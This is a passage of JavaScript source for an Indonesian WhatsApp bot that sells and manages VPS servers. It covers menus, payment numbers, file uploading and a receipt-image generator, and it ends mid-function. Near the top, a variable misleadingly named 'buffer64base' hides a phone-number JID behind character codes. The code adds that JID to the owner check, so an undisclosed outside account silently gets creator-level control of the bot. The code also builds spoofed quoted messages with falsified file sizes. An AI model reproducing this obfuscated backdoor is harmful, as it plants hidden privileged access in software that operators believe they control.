const crypto = require("crypto")
const { Client } = require('ssh2');

module.exports = async (syah, m, store, msg) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const text = q = args.join(" ")
const botNumber = await syah.decodeJid(syah.user.id)
const owner = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owner].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPremium = premium.includes(m.sender)
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await syah.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

// >~~~~~~~~ Fake Quoted ~~~~~~~~~~< //

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${namaowner}`, inviteExpiration: 0 }}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": `υρтιмє : ${runtime(process.uptime())}`,
                    "jpegThumbnail": ''
                          }
                        }
                      } 

const syahreply = async (teks) => {
    return syah.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: `© Powered by ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: global.linkGrup
            }
        }
    }, { quoted: qtext });
};
const reaction = async (jidss, emoji) => {
syah.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
// >~~~~~~~~~~ Function ~~~~~~~~~~~< //

const example = (teks) => {
return `\n *ᴋᴀʏᴀ ɢɪɴɪ wyii :*\n *${prefix+command}* ${teks}\n`
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${body || m.mtype} \n` +
`   ⌬ Pengirim: ${pushname} \n` +
`   ⌬ JID: ${m.sender}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${m.isGroup} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
const qfake = {
    key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "B612",
        participant: "0@s.whatsapp.net"
    },
    message: {
        extendedTextMessage: {
            text: `${botname}`,
            matchedText: `${botname}`,
            canonicalUrl: "https://www.whatsapp.com",
            description: `${namaOwner}`,
            title: "WhatsApp",
            previewType: 0
        }
    }
};    

// >~~~~~~~~~ Command ~~~~~~~~~~< //

switch (command) {
case 'menu': {
await syah.sendMessage(m.chat, { react: { text: "⌛",key: m.key,}}); 
let menu = `
> 👋@${m.sender.split("@")[0]}
\`𝘏𝘈𝘓𝘖 𝘚𝘈𝘠𝘈 𝘈𝘋𝘈𝘓𝘈𝘏 𝘉𝘖𝘛 𝘊𝘙𝘌𝘈𝘛𝘌 𝘝𝘗𝘚 𝘜𝘕𝘛𝘜𝘒 𝘔𝘌𝘔𝘉𝘈𝘕𝘛𝘜 𝘈𝘕𝘋𝘈 𝘋𝘈𝘓𝘈𝘔 𝘊𝘙𝘌𝘈𝘛𝘌 𝘝𝘗𝘚\`
  
*\`- INFORMATION BOT\`*
 *⌬ Botname* : 𝘊𝘙𝘌𝘈𝘛𝘌 𝘝𝘗𝘚
 *⌬ Owner* : WYII
 *⌬ Version* : 1.0
 *⌬ Status* : *${syah.public ? "Public" : "Self"}*
--------------------------------------------
sᴇʟʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴘʟᴇᴀsᴇ`;

await syah.sendMessage(m.chat, {
  footer: `© WYII`,
  buttons: [
    {
    buttonId: '.tqto',
      buttonText: { displayText: 'MAKASIH' },
      type: 1
    },
    {
      buttonId: '.vpsmenu',
      buttonText: { displayText: 'VPS MENU' },
      type: 1
    },
    {
    buttonId: '.installmenu',
      buttonText: { displayText: 'INSTALLPANEL' },
      type: 1
    },
    {
    buttonId: '.buyvps',
      buttonText: { displayText: 'BUY VPS' },
      type: 1
    },
    {
    buttonId: '.subdomenu',
      buttonText: { displayText: 'SUBDO MENU' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST FITUR',
          sections: [
            {
              title: 'MENU UNGGULAN',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `BY WYII`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 999999999999999999999999999999999999999999999999,
  caption: menu,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363420150801545@newsletter',
   newsletterName: 'WYII'
   },    
    externalAdReply: {
      title: `©CVPS WYII`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.urlfoto,
      sourceUrl: 'https://whatsapp.com/channel/0029VbB14Ff9xVJb0nNlI31s',
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "vpsmenu": {        
await syah.sendMessage(m.chat, { react: { text: "🚀",key: m.key,}}); 
let teks = `
┏━━━━「 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘚𝘐 」━━⬣      
┃ ▢ 𝙲𝚁𝙴𝙳𝙸𝚃 : WYII 
┃ ▢ ʙᴏᴛ ɴᴀᴍᴇ: 𝘊𝘙𝘌𝘈𝘛𝘌 𝘝𝘗𝘚
┃ ▢ ᴠᴇʀsɪᴏɴ: 1.0
┃ ▢ sᴛᴀᴛᴜs: *${syah.public ? "Public" : "Self"}*
┗━━━━━━━━━━━━━━━━━━━━━⬣  
┏━━━━「 𝘋𝘐𝘎𝘐𝘛𝘈𝘓 𝘔𝘌𝘕𝘜 」   
┃ ▢ 𝘊𝘝𝘗𝘚
┃ ▢ 𝘚𝘐𝘚𝘈𝘋𝘙𝘖𝘗𝘓𝘌𝘛
┃ ▢ 𝘋𝘌𝘓𝘋𝘙𝘖𝘗𝘓𝘌𝘛
┃ ▢ 𝘓𝘐𝘚𝘛𝘋𝘙𝘖𝘗𝘓𝘌𝘛
┃ ▢ 𝘙𝘌𝘉𝘜𝘐𝘓𝘋
┃ ▢ 𝘙𝘌𝘚𝘛𝘈𝘙𝘛𝘝𝘗𝘚
┃ ▢ 𝘚𝘛𝘈𝘙𝘛𝘝𝘗𝘚
┃ ▢ 𝘚𝘛𝘖𝘗𝘝𝘗𝘚
┃ ▢ 𝘈𝘋𝘋𝘖𝘞𝘕
┃ ▢ 𝘋𝘌𝘓𝘖𝘞𝘕
┃ ▢ 𝘚𝘛𝘙𝘜𝘒
┃ ▢ 𝙄𝙉𝙎𝙏𝘼𝙇𝙇𝙋𝙍𝙊𝙏𝙀𝘾𝙏
┃ ▢ 𝘊𝘌𝘒𝘐𝘋𝘊𝘏
┃ ▢ 𝘛𝘖𝘜𝘙𝘓
┗━━━━━━━━━━━━━━━━━━━━━⬣
`
await syah.sendMessage(m.chat, {
    caption: teks,
    footer: `WYII`,
    buttons: [
      {
        buttonId: `.menu`,
        buttonText: { displayText: 'BACK MENU' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '⚔️ MENU INTERAKTIF' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '【 KETUK DIBAWAH INI 】',
            sections: [
              {
                title: 'MENU MAKASIH',
                highlight_label: 'TERIMKASIH',
                rows: [
                  {
                    title: 'MAMASIH',
                    id: '.tqto'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `⚙️ Dibuat oleh: ${namaOwner} </>`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 9999999999999999n,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idsaluran,
        newsletterName: global.namasaluran
      },
      externalAdReply: {
        title: `【 ${botname} 】v${versi}`,
        body: `🕒 Aktif Selama: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        sourceUrl: global.channel,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  })

  await syah.sendPresenceUpdate('available', m.chat) // stop ketik
}
break
        
case "installmenu": {        
await syah.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });
let iye = `
┏━━━━「 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘚𝘐 」━━⬣      
┃ ▢ 𝙲𝚁𝙴𝙳𝙸𝚃 : WYII 
┃ ▢ ʙᴏᴛ ɴᴀᴍᴇ: 𝘊𝘝𝘗𝘚 𝘔𝘌𝘕𝘜
┃ ▢ ᴠᴇʀsɪᴏɴ: 1.0
┃ ▢ sᴛᴀᴛᴜs: *${syah.public ? "Public" : "Self"}*
┗━━━━━━━━━━━━━━━━━━━━━⬣  
┏━━━━「 𝘐𝘕𝘚𝘛𝘈𝘓𝘓 𝘔𝘌𝘕𝘜 」   
┃ ▢ 𝘏𝘈𝘊𝘒𝘉𝘈𝘊𝘒𝘗𝘈𝘕𝘌𝘓
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘗𝘈𝘕𝘌𝘓
┃ ▢ 𝘜𝘕𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘗𝘈𝘕𝘌𝘓
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘕𝘖𝘖𝘒𝘛𝘏𝘌𝘔𝘌
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘞𝘐𝘕𝘎𝘚
┃ ▢ 𝘜𝘕𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘞𝘐𝘕𝘎𝘚
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈
┃ ▢ 𝘜𝘕𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘚𝘛𝘌𝘓𝘓𝘈𝘙
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘌𝘓𝘠𝘚𝘐𝘠𝘜𝘔
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘋𝘌𝘗𝘌𝘕𝘋
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘕𝘌𝘉𝘜𝘓𝘈
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘕𝘐𝘎𝘏𝘛𝘊𝘖𝘙𝘌
┃ ▢ 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘛𝘌𝘔𝘈𝘉𝘐𝘓𝘓𝘐𝘕𝘎
┗━━━━━━━━━━━━━━━━━━━━━⬣
`
await syah.sendMessage(m.chat, {
    caption: iye,
    footer: `WYII`,
    buttons: [
      {
        buttonId: `.menu`,
        buttonText: { displayText: 'BACK MENU' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: '⚔️ MENU INTERAKTIF' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '【 KETUK DIBAWAH INI 】',
            sections: [
              {
                title: 'MENU MAKASIH',
                highlight_label: 'TERIMKASIH',
                rows: [
                  {
                    title: 'MAMASIH',
                    id: '.tqto'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `⚙️ Dibuat oleh: ${namaOwner} </>`,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    fileLength: 9999999999999999n,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idsaluran,
        newsletterName: global.namasaluran
      },
      externalAdReply: {
        title: `【 ${botname} 】v${versi}`,
        body: `🕒 Aktif Selama: ${runtime(process.uptime())}`,
        thumbnailUrl: global.image.menu,
        sourceUrl: global.channel,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  })

  await syah.sendPresenceUpdate('available', m.chat) // stop ketik
}
break
        
case "subdomenu": {        
await syah.sendMessage(m.chat, { react: { text: "🌐",key: m.key,}}); 
let subdo = `
┏━━━━「 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘚𝘐 」━━⬣      
┃ ▢ 𝙲𝚁𝙴𝙳𝙸𝚃 : WYII 
┃ ▢ ʙᴏᴛ ɴᴀᴍᴇ: 𝘊𝘝𝘗𝘚 𝘔𝘌𝘕𝘜
┃ ▢ ᴠᴇʀsɪᴏɴ: 1.0
┃ ▢ sᴛᴀᴛᴜs: *${syah.public ? "Public" : "Self"}*
┗━━━━━━━━━━━━━━━━━━━━━⬣  
┏━━━━「 𝘚𝘜𝘉𝘋𝘖𝘔𝘈𝘐𝘕 𝘔𝘌𝘕𝘜 」   
┃ ▢ 𝘚𝘜𝘉𝘋𝘖
┃ ▢ 𝘋𝘌𝘓𝘚𝘜𝘉𝘋𝘖
┃ ▢ 𝘋𝘌𝘓𝘈𝘓𝘓𝘚𝘜𝘉𝘋𝘖
┃ ▢ 𝘓𝘐𝘚𝘛𝘚𝘜𝘉𝘋𝘖
┗━━━━━━━━━━━━━━━━━━━━━⬣
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".vpsmenu", buttonText: { displayText: "VPS MENU" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: subdo,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "WYIISTORE"
            }
        },
        footer: "©WYIISTORE",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "tqto": {
let makasih = `*\`▧ 「 𝘔𝘈𝘒𝘈𝘚𝘐𝘏 𝘚𝘌𝘔𝘜𝘈 」\`*
ᴀʟʟᴀʜ (ᴍʏ ɢᴏᴏᴅ)
ᴍʏ ᴋᴇʟᴜᴀʀɢᴀ (SUPPORT)
WYII (DEVELOPER)
WYII (CEO)
ᴀʟʟ ᴘᴇɴɢɢᴜɴᴀ sᴄʀɪᴘᴛ
\`TERIMAKASIH UDAH SUPPORT SYAH SEJAUH INI\``
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".owner", buttonText: { displayText: "OWNER" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: makasih,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "WYII"
            }
        },
        footer: "© WYII",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "buyvps": {        
await syah.sendMessage(m.chat, { react: { text: "💸",key: m.key,}}); 
let teks = `
*VPS R16 CORE 8 = 40K*
*VPS 16GB CORE 4 = 30k*
*VPS 8GB CORE 4 =26k*
*VPS 8GB C2 = 24K*
*VPS 4GB C2 = 20K*
*VPS 2GB C1 = 18K*
\`ALL FREE INSTALL KETUA\`
PV: t.me:/wyiiofficial

*_BISA NEGO/DP_*

ALL FREE REQ TEMA/VERSI EGG/VERSI OS/REGION/FREE SC CPANEL
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".vpsmenu", buttonText: { displayText: "VPS MENU" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: teks,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "WYII"
            }
        },
        footer: "© WYII",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "proses": {
    if (!isCreator) return syahreply(mess.owner);
    let [barang] = text.split(",").map(v => v.trim())
    if (!barang) {
    return m.reply("*Format salah*\ncontoh :\n.proses <barang>")
    }
    barang = barang.toUpperCase()
    let teks = 
`—·· *${namaowner}* ··—

* *Layanan :* ${barang}
* *Tanggal :* ${date}`
    await syah.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Transaksi Proses ☑️`,
                body: `©WYII`,
                thumbnailUrl: global.urlfoto,
                sourceUrl: global.channel,
            },
        },
    }, { quoted: qtext })
}
break
case "d":
case "done": {
    if (!isCreator) return syahreply(mess.owner);
    let [jumlah, barang, harga, payment] = text.split(",").map(v => v.trim())
    if (!jumlah|| !barang || !harga || !payment) {
        return m.reply("*Format salah*\ncontoh :\n.done <urutan trx>,<barang>,<harga>,<payment>")
    }

    barang = barang.toUpperCase() 
    payment = payment.toUpperCase()

    let teks = 
`*#${jumlah}* —·· *${namaowner}* ··—

* *Layanan :* ${barang}
* *Harga :* ${harga}
* *Payment :* ${payment}
* *Tanggal :* ${date}
`

    await syah.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Transaksi Done ✅`,
                body: `©WYII`,
                thumbnailUrl: global.urlfoto,
                sourceUrl: global.channel,
            },
        },
    }, { quoted: qtext })
}
break
case "gopay": {
if (!isCreator) return;
let teks = `
*PAYMENT GOPAY ${global.namaOwner}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
let msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender]
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"Copy DANA","id":"danabtn","copy_code":"${global.gopay}"}`
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext })

  await syah.relayMessage(m.chat, msgii.message, {
    messageId: msgii.key.id
  })
}
break;
case "dana": {
  if (!isCreator) return;

  let teks = `
*PAYMENT DANA ${global.namaOwner}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`

  let msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender]
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"Copy DANA","id":"danabtn","copy_code":"${global.dana}"}`
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext })

  await syah.relayMessage(m.chat, msgii.message, {
    messageId: msgii.key.id
  })
}
break;
case 'tourl' : {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 syah.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 // Tombol interaktif
            const teks = caption;
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            body: {
                                text: teks
                            },
                            footer: {
                                text: "© SYAH - 2025"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text": "SALIN LINK","copy_code": "${url}"}`
                                    },
                                ],
                            },
                        },
                    },
                },
            }, { quoted: m });

            await syah.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
 } catch (e) {
 console.error(e);
 syahreply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 syahreply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
 }
};
 break        
case "cekidch": case "idch": {
await syah.sendMessage(m.chat, { react: { text: "⌛",key: m.key,}}); 
if (!text) return syahreply(example("linkchnya mana goblok bet lu?"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await syah.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Verif"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext})
await syah.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break;
case 'struk': {
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(`❌ *Format salah!*\nGunakan: ${prefix + command} toko|id_transaksi|harga_barang|harga_admin|nomor_tujuan|status|nama_barang`);

    let [toko, idTransaksi, hargaBarang, hargaAdmin, nomorTujuan, status, namaBarang] = text.split("|");
    if (!toko || !idTransaksi || !hargaBarang || !hargaAdmin || !nomorTujuan || !status || !namaBarang)
        return syahreply("⚠️ *Format tidak lengkap!*");

    let validStatus = ["done", "dp", "cicil", "hutang"];
    if (!validStatus.includes(status.toLowerCase()))
        return syahreply("⚠️ *Status tidak valid! Gunakan: done, DP, cicil, atau hutang*");

    hargaBarang = parseInt(hargaBarang);
    hargaAdmin = parseInt(hargaAdmin);
    if (isNaN(hargaBarang) || isNaN(hargaAdmin)) 
        return syahreply("⚠️ *Harga barang dan admin harus berupa angka!*");

    const totalKeseluruhan = hargaBarang + hargaAdmin;
    const { createCanvas, loadImage } = require('canvas');
    const qrcode = require('qrcode');
    const fs = require('fs');

    const canvasWidth = 400, canvasHeight = 700;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');

    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Logo
    const logoPath = "./toko/logo.png";
    if (fs.existsSync(logoPath)) {
        const logo = await loadImage(logoPath);
        ctx.drawImage(logo, (canvasWidth - 100) / 2, 10, 100, 100);
    }

    let y = fs.existsSync(logoPath) ? 130 : 40;
    ctx.fillStyle = "#000";
    ctx.font = "bold 20px monospace";
    ctx.textAlign = "center";

    ctx.fillText(toko.toUpperCase(), canvasWidth / 2, y);

    // Waktu realtime
    const now = new Date();
    const dateStr = now.toLocaleDateString("id-ID", { timeZone: "Asia/Jakarta" });
    const timeStr = now.toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta" });

    ctx.font = "14px monospace";
    ctx.fillText(`Blora, ${dateStr} ${timeStr}`, canvasWidth / 2, y += 25);

    // Info transaksi
    ctx.textAlign = "left";
    ctx.fillText(`ID Transaksi:`, 20, y += 30);
    ctx.textAlign = "right";
    ctx.fillText(idTransaksi, canvasWidth - 20, y);

    ctx.textAlign = "left";
    ctx.fillText(`Nomor Tujuan:`, 20, y += 20);
    ctx.textAlign = "right";
    ctx.fillText(nomorTujuan, canvasWidth - 20, y);

    ctx.textAlign = "left";
    ctx.fillText(`Status:`, 20, y += 20);
    ctx.textAlign = "right";
    ctx.fillText(status.toUpperCase(), canvasWidth - 20, y);

    ctx.beginPath();
    ctx.moveTo(20, y += 10);
    ctx.lineTo(canvasWidth - 20, y);
    ctx.stroke();

    // Barang
    ctx.textAlign = "left";
    ctx.fillText(`1. ${namaBarang}`, 20, y += 25);
    ctx.textAlign = "right";
    ctx.fillText(`Rp${hargaBarang.toLocaleString()}`, canvasWidth - 20, y);

    ctx.beginPath();
    ctx.moveTo(20, y += 10);
    ctx.lineTo(canvasWidth - 20, y);
    ctx.stroke();

    // Total
    ctx.textAlign = "left";
    ctx.fillText(`Total`, 20, y += 25);
    ctx.textAlign = "right";
    ctx.fillText(`Rp${hargaBarang.toLocaleString()}`, canvasWidth - 20, y);

    ctx.textAlign = "left";
    ctx.fillText(`Admin`, 20, y += 20);
    ctx.textAlign = "right";
    ctx.fillText(`Rp${hargaAdmin.toLocaleString()}`, canvasWidth - 20, y);

    ctx.beginPath();
    ctx.moveTo(20, y += 10);
    ctx.lineTo(canvasWidth - 20, y);
    ctx.stroke();

    ctx.textAlign = "left";
    ctx.fillText(`Total Keseluruhan`, 20, y += 25);
    ctx.textAlign = "right";
    ctx.fillText(`Rp${totalKeseluruhan.toLocaleString()}`, canvasWidth - 20, y);

    ctx.beginPath();
    ctx.moveTo(20, y += 10);
    ctx.lineTo(canvasWidth - 20, y);
    ctx.stroke();

    // Footer info
    ctx.textAlign = "left";
    ctx.fillText(`Tanggal: ${dateStr}`, 20, y += 25);
    ctx.fillText(`Waktu: ${timeStr}`, 20, y += 20);
